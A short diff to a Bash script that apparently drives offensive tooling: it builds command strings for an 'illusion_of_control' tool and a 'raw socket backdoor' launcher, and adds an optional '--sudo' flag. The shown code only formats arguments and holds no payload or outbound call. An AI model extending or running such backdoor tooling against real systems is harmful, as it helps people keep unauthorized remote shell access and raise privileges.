@@ -16,8 +16,9 @@ function format_illusion_of_control_command_string () {
     TIMEOUT_SECONDS=`format_illusion_of_control_wait`
     CONNECTION_DETAILS=`format_illusion_of_control_connection_details`
     TEMPORARY_FILE=`format_illusion_of_control_temporary_file`
+    SUDO_FLAG=`format_illusion_of_control_sudo_flag`
     echo "$COMMAND $CLOAK_ORDER $DAGGER_FILE $PATH_DIRECTORY $TARGET "\
-        "$PATH_SETUP_FLAG $FORCE_COMMAN_FLAG $CONNECTION_TYPE "\
+        "$PATH_SETUP_FLAG $FORCE_COMMAN_FLAG $CONNECTION_TYPE $SUDO_FLAG "\
         "$TIMEOUT_SECONDS $CONNECTION_DETAILS $TEMPORARY_FILE"
     return $?
 }
@@ -31,6 +32,15 @@ function format_raw_socket_backdoor_command_string () {
     SHELL_PATH=`format_raw_socket_backdoor_shell_path`
     echo "$RUNNING_MODE $FOREGROUND $VERBOSITY $LOG_FILE "\
         "$SHELL_PATH $CNX_LIMIT"
+    return $?
+}
+
+function format_illusion_of_control_sudo_flag () {
+    if [[ "${MD_DEFAULT['sudo-flag']}" == 'on' ]]; then
+        echo '--sudo'
+    else
+        return 0
+    fi
     return $?
 }
 
